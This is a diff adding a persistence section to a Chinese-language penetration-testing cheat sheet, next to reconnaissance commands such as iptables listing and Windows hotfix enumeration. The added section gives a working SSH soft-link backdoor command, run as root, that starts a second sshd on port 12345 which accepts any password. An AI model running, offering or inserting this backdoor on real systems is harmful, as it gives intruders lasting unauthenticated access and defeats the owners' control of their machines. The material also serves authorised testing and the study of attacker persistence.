@@ -62,6 +62,12 @@ iptables -L    # 列出iptable的配置规则
 
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”
+### 权限维持
+
+ssh软连接后门 需root执行后门命令，任意密码登录
+```shell
+ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
+```
 
 # 04自动信息收集
 Host Information Gathering Script：HIGS.bat
